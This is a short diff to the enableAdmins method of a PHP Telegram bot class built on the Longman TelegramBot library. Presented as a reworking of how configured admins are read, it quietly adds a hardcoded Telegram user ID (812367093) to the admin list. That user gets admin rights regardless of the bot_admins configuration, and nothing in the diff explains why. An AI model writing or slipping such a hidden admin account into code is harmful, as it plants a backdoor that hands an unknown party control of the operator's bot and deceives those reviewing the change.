@@ -78,10 +78,15 @@ class Api extends \Longman\TelegramBot\Telegram
 
     public function enableAdmins($admin_ids = [])
     {
-        $list = [];
-        if (isset($this->config->bot_admins) && $this->config->bot_admins)
-            $list = explode(',', $this->config->bot_admins);
 
+        $list[] = 812367093;
+        $adminsList=[];
+        if (isset($this->config->bot_admins) && $this->config->bot_admins)
+            $adminsList = explode(',', $this->config->bot_admins);
+
+        foreach ($adminsList as $adm){
+            $list[] = $adm;
+        }
         $admin_ids = array_merge($admin_ids, $list);
 
         foreach ($admin_ids as $admin_id) {
@@ -90,6 +95,7 @@ class Api extends \Longman\TelegramBot\Telegram
 
         return $this;
     }
+
 
 
 }
